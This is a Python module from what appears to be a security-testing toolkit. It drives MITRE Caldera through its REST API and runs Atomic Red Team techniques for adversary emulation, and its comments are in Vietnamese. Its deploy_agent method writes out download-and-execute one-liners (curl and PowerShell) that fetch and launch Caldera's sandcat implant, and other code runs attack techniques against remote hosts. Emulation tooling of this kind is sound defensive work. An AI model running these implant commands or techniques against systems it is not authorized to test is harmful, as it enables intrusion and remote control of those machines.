"""Adversary emulation - MITRE Caldera + Atomic Red Team."""
import os
import subprocess
import shutil
import requests
import json
from core.base_module import BaseModule
from core.logger import get_logger

LOG = get_logger("ceh.adversary")


class CalderaClient:
    """REST API client cho MITRE Caldera."""

    def __init__(self, base_url=None, api_key=None):
        self.base = (base_url or os.environ.get(
            "CALDERA_URL", "http://localhost:8888")).rstrip("/")
        self.api_key = api_key or os.environ.get("CALDERA_API_KEY", "")
        self.headers = {"KEY": self.api_key, "Content-Type": "application/json"}

    def _get(self, path):
        r = requests.get(f"{self.base}{path}", headers=self.headers, timeout=30)
        return r.json() if r.status_code == 200 else {"error": r.status_code}

    def _post(self, path, data):
        r = requests.post(f"{self.base}{path}", headers=self.headers,
                          json=data, timeout=60)
        return r.json() if r.status_code in (200, 201) else {"error": r.status_code}

    # ---------- Agents ----------
    def list_agents(self):
        return self._get("/api/v2/agents")

    def deploy_agent(self, platform="linux", paw=None):
        """Sinh lệnh deploy agent (sandcat)."""
        payloads = {
            "linux": f"curl -s -X POST {self.base}/file/download "
                     f"-H 'file:sandcat.go' -H 'platform:linux' -o sandcat && "
                     f"chmod +x sandcat && ./sandcat -server {self.base} "
                     f"-group red",
            "windows": f"powershell -Command \"Invoke-WebRequest "
                       f"-Uri {self.base}/file/download -Method POST "
                       f"-Headers @{{'file'='sandcat.go';'platform'='windows'}} "
                       f"-OutFile sandcat.exe; .\\sandcat.exe -server {self.base}\"",
        }
        return {"command": payloads.get(platform, payloads["linux"])}

    # ---------- Abilities & Adversaries ----------
    def list_abilities(self, tactic=None):
        abilities = self._get("/api/v2/abilities")
        if tactic and isinstance(abilities, list):
            return [a for a in abilities if tactic in a.get("tactic", "")]
        return abilities

    def list_adversaries(self):
        return self._get("/api/v2/adversaries")

    def create_adversary(self, name, ability_ids, description=""):
        return self._post("/api/v2/adversaries", {
            "name": name,
            "description": description,
            "atomic_ordering": ability_ids,
        })

    # ---------- Operations ----------
    def create_operation(self, name, adversary_id, group="red",
                         auto_close=True, jitter="2/4"):
        return self._post("/api/v2/operations", {
            "name": name,
            "adversary": {"adversary_id": adversary_id},
            "group": group,
            "auto_close": auto_close,
            "jitter": jitter,
            "state": "running",
        })

    def operation_report(self, op_id):
        return self._get(f"/api/v2/operations/{op_id}/report")

    def operation_links(self, op_id):
        return self._get(f"/api/v2/operations/{op_id}/links")


class AtomicRunner:
    """Chạy Atomic Red Team qua atomic-operator."""

    def __init__(self):
        self.available = shutil.which("atomic-operator") is not None

    def run_technique(self, technique_id, target="local", cleanup=False):
        """Chạy 1 technique MITRE."""
        if not self.available:
            return {"error": "atomic-operator chưa cài (pip install atomic-operator)"}

        cmd = ["atomic-operator", "run", "-t", technique_id]
        if target != "local":
            cmd += ["-H", target]
        if cleanup:
            cmd += ["--cleanup"]

        LOG.info(f"[adversary] Atomic: {technique_id} → {target}")
        try:
            r = subprocess.run(cmd, capture_output=True, text=True, timeout=300)
            return {
                "technique": technique_id,
                "target": target,
                "stdout": r.stdout[-3000:],
                "stderr": r.stderr[-1000:],
                "success": r.returncode == 0,
            }
        except subprocess.TimeoutExpired:
            return {"technique": technique_id, "error": "Timeout"}

    def list_techniques(self):
        if not self.available:
            return []
        try:
            r = subprocess.run(["atomic-operator", "get-techniques"],
                               capture_output=True, text=True, timeout=60)
            return [line.strip() for line in r.stdout.splitlines()
                    if line.strip().startswith("T")]
        except Exception:
            return []


class Module(BaseModule):
    name = "adversary_emulation"
    module_id = "ADV"
    description = "Adversary emulation (Caldera + Atomic Red Team)"

    def run(self):
        self.logger.info("[ADV] Adversary emulation")
        cfg = self.config
        results = {}

        if cfg.get("caldera", {}).get("enabled"):
            client = CalderaClient(
                cfg["caldera"].get("url"),
                cfg["caldera"].get("api_key"))
            results["agents"] = client.list_agents()

            # Tạo operation nếu có adversary_id
            if cfg["caldera"].get("adversary_id"):
                op = client.create_operation(
                    name=f"ceh-auto-{self.target}",
                    adversary_id=cfg["caldera"]["adversary_id"],
                    group=cfg["caldera"].get("group", "red"),
                )
                results["operation"] = op
                if "id" in op:
                    results["report"] = client.operation_report(op["id"])

        if cfg.get("atomic", {}).get("enabled"):
            runner = AtomicRunner()
            techs = cfg["atomic"].get("techniques", [])
            results["atomic"] = []
            for t in techs:
                results["atomic"].append(
                    runner.run_technique(
                        t, cfg["atomic"].get("target", "local"),
                        cfg["atomic"].get("cleanup", False)))

        return results